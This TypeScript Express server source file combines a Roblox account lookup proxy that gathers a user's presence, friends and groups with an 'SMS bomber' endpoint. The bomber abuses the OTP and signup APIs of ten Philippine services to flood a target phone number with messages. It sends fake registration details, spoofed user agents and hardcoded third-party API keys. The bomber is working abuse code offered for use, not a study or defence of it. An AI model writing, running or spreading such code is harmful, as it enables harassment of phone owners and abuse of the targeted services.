import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import axios from "axios";

import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const STATS_FILE = path.join(__dirname, "stats.json");

// Load or initialize stats
let globalStats = {
  totalUsers: 0,
  totalLookups: 0,
  totalSmsSent: 0,
  robloxApiStatus: "Working",
  encryptorStatus: "Working",
  smsBomberStatus: "Working"
};

let uniqueUsers = new Set<string>();

function loadStats() {
  try {
    if (fs.existsSync(STATS_FILE)) {
      const data = JSON.parse(fs.readFileSync(STATS_FILE, "utf-8"));
      globalStats = { ...globalStats, ...data.stats };
      uniqueUsers = new Set(data.uniqueUsers || []);
    }
  } catch (error) {
    console.error("Error loading stats:", error);
  }
}

function saveStats() {
  try {
    const data = {
      stats: globalStats,
      uniqueUsers: Array.from(uniqueUsers)
    };
    fs.writeFileSync(STATS_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving stats:", error);
  }
}

loadStats();

const USERS_API = "https://users.roblox.com";
const FRIENDS_API = "https://friends.roblox.com";
const GROUPS_API = "https://groups.roblox.com";
const BADGES_API = "https://badges.roblox.com";
const INVENTORY_API = "https://inventory.roblox.com";
const THUMBNAILS_API = "https://thumbnails.roblox.com";
const PRESENCE_API = "https://presence.roblox.com";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Stats API
  app.get("/api/stats", (req, res) => {
    res.json(globalStats);
  });

  app.post("/api/stats/increment", (req, res) => {
    const { field, userId } = req.body;
    
    if (field === "totalUsers" && userId) {
      if (!uniqueUsers.has(userId)) {
        uniqueUsers.add(userId);
        globalStats.totalUsers++;
        saveStats();
      }
    } else if (field === "totalLookups") {
      globalStats.totalLookups++;
      saveStats();
    } else if (field === "totalSmsSent") {
      globalStats.totalSmsSent++;
      saveStats();
    }
    
    res.json({ success: true, stats: globalStats });
  });

  // Roblox API Proxy
  app.get("/api/roblox/lookup/:username", async (req, res) => {
    const { username } = req.params;
    
    const fetchWithRetry = async (url: string, options: any = {}, retries = 3, backoff = 1000) => {
      try {
        return await axios(url, options);
      } catch (error: any) {
        if (retries > 0 && error.response?.status === 429) {
          console.log(`Rate limited on ${url}. Retrying in ${backoff}ms...`);
          await new Promise(resolve => setTimeout(resolve, backoff));
          return fetchWithRetry(url, options, retries - 1, backoff * 2);
        }
        throw error;
      }
    };

    try {
      // 1. Get User ID by Username
      const userSearchResponse = await fetchWithRetry(`${USERS_API}/v1/usernames/users`, {
        method: 'POST',
        data: {
          usernames: [username],
          excludeBannedUsers: false
        }
      });

      const userData = userSearchResponse.data.data[0];
      if (!userData) {
        return res.status(404).json({ error: "User not found" });
      }

      const userId = userData.id;

      // 2. Get Detailed User Info, Friends, Followers, Groups, Presence, and Thumbnails in parallel
      const [
        userInfoResponse,
        friendsCount,
        followersCount,
        followingCount,
        groupsResponse,
        presenceResponse,
        avatarResponse,
        badgesResponse
      ] = await Promise.all([
        fetchWithRetry(`${USERS_API}/v1/users/${userId}`),
        fetchWithRetry(`${FRIENDS_API}/v1/users/${userId}/friends/count`).then(r => r.data.count),
        fetchWithRetry(`${FRIENDS_API}/v1/users/${userId}/followers/count`).then(r => r.data.count),
        fetchWithRetry(`${FRIENDS_API}/v1/users/${userId}/followings/count`).then(r => r.data.count),
        fetchWithRetry(`${GROUPS_API}/v1/users/${userId}/groups/roles`),
        fetchWithRetry(`${PRESENCE_API}/v1/presence/users`, {
          method: 'POST',
          data: { userIds: [userId] }
        }),
        fetchWithRetry(`${THUMBNAILS_API}/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`),
        fetchWithRetry(`${BADGES_API}/v1/users/${userId}/badges?limit=10&sortOrder=Desc`)
      ]);

      const userInfo = userInfoResponse.data;
      const groups = groupsResponse.data.data;
      const presence = presenceResponse.data.userPresences[0];
      const avatarUrl = avatarResponse.data.data[0]?.imageUrl || "";
      const badgesCount = badgesResponse.data.data.length;

      // Determine last location from presence
      let lastLocation = "Offline";
      if (presence) {
        if (presence.userPresenceType === 2) lastLocation = "In Game";
        else if (presence.userPresenceType === 1) lastLocation = "Online (Website)";
        else if (presence.lastLocation) lastLocation = presence.lastLocation;
      }

      // Aggregate Data
      const record = {
        account_info: `${username}:HIDDEN_FOR_SECURITY`,
        query: username,
        uid: userId.toString(),
        nickname: userInfo.name,
        display_name: userInfo.displayName,
        profile_url: `https://www.roblox.com/users/${userId}/profile`,
        avatar: avatarUrl,
        join_date: userInfo.created,
        friends: friendsCount.toString(),
        followers: followersCount.toString(),
        following: followingCount.toString(),
        badges: badgesCount,
        groups: groups.length,
        owned_groups: groups.filter((g: any) => g.group.owner && g.group.owner.id === userId).length,
        collectibles: 0, // Requires inventory API which is often private
        rap: "N/A",
        premium: userInfo.isPremium ? "Yes" : "No",
        email_verified: "Unknown",
        last_location: lastLocation,
        banned: userInfo.isBanned ? "Yes" : "No",
      };

      res.json(record);
    } catch (error: any) {
      console.error("Roblox Lookup Error:", error.message);
      res.status(500).json({ error: "Failed to fetch Roblox data" });
    }
  });

  // SMS Bomber Proxy
  app.post("/api/sms/bomb", async (req, res) => {
    const { phoneNumber, service } = req.body;
    const formattedNum = phoneNumber.startsWith('0') ? phoneNumber.replace('0', '+63') : `+63${phoneNumber}`;
    const rawNum = phoneNumber.startsWith('0') ? phoneNumber.substring(1) : phoneNumber;
    const cleanNum = phoneNumber.startsWith('0') ? phoneNumber : `0${phoneNumber}`;

    const randomStr = (len: number) => Math.random().toString(36).substring(2, 2 + len);

    try {
      let response;
      switch (service) {
        case "S5.com": {
          const boundary = "----WebKitFormBoundary" + randomStr(16);
          const data = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${formattedNum}\r\n--${boundary}--\r\n`;
          response = await axios.post('https://api.s5.com/player/api/v1/otp/request', data, {
            headers: {
              'content-type': `multipart/form-data; boundary=${boundary}`,
              'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
              'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
            }
          });
          break;
        }
        case "Xpress PH": {
          response = await axios.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", {
            "FirstName": "toshi",
            "LastName": "premium",
            "Email": `toshi${Date.now()}@gmail.com`,
            "Phone": formattedNum,
            "Password": "ToshiPass123",
            "ConfirmPassword": "ToshiPass123",
            "ImageUrl": "",
            "RoleIds": [4],
            "Area": "manila",
            "City": "manila",
            "PostalCode": "1000",
            "Street": "toshi_street",
            "ReferralCode": "",
            "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
            "FingerprintRequestId": "1757149666261.Rr1VvG",
          }, {
            headers: { "User-Agent": "Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart" }
          });
          break;
        }
        case "Abenson": {
          response = await axios.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', 
            `contact_no=${cleanNum}&login_token=undefined`, 
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
          );
          break;
        }
        case "Excellente Lending": {
          response = await axios.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', {
            "domain": cleanNum,
            "cat": "login",
            "previous": false,
            "financial": "efe35521e51f924efcad5d61d61072a9"
          }, {
            headers: { 'x-package-name': 'com.support.excellenteralending' }
          });
          break;
        }
        case "FortunePay": {
          response = await axios.post('https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register', {
            "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
            "deviceType": 'GOOGLE_PLAY',
            "companyId": '4bf735e97269421a80b82359e7dc2288',
            "dialCode": '+63',
            "phoneNumber": rawNum
          });
          break;
        }
        case "WeMove": {
          response = await axios.post('https://api.wemove.com.ph/auth/users', {
            "phone_country": '+63',
            "phone_no": rawNum
          });
          break;
        }
        case "LBC": {
          response = await axios.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', 
            new URLSearchParams({
              'verification_type': 'mobile',
              'client_email': `${randomStr(8)}@gmail.com`,
              'client_contact_code': '+63',
              'client_contact_no': rawNum,
              'app_log_uid': randomStr(16),
              'app_platform': 'Android',
              'device_name': 'rosemary_p_global',
              'app_version': '3.0.67',
              'app_hash': randomStr(32),
            }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'api': 'LBC', 'token': 'CONNECT' } }
          );
          break;
        }
        case "Pickup Coffee": {
          response = await axios.post('https://production.api.pickup-coffee.net/v2/customers/login', {
            "mobile_number": formattedNum,
            "login_method": 'mobile_number'
          }, {
            headers: { 'x-env': 'Production', 'x-app-version': '2.7.0' }
          });
          break;
        }
        case "HoneyLoan": {
          response = await axios.post('https://api.honeyloan.ph/api/client/registration/step-one', {
            "phone": cleanNum,
            "is_rights_block_accepted": 1
          });
          break;
        }
        case "Komo": {
          response = await axios.post('https://api.komo.ph/api/otp/v5/generate', {
            "mobile": cleanNum,
            "transactionType": 6
          }, {
            headers: { 'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba' }
          });
          break;
        }
        default:
          return res.status(400).json({ error: "Unknown service" });
      }
      res.json({ success: true, status: response.status });
    } catch (error: any) {
      console.error(`SMS Bomb Error (${service}):`, error.message);
      res.status(error.response?.status || 500).json({ 
        success: false, 
        error: error.message,
        details: error.response?.data 
      });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(__dirname, "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
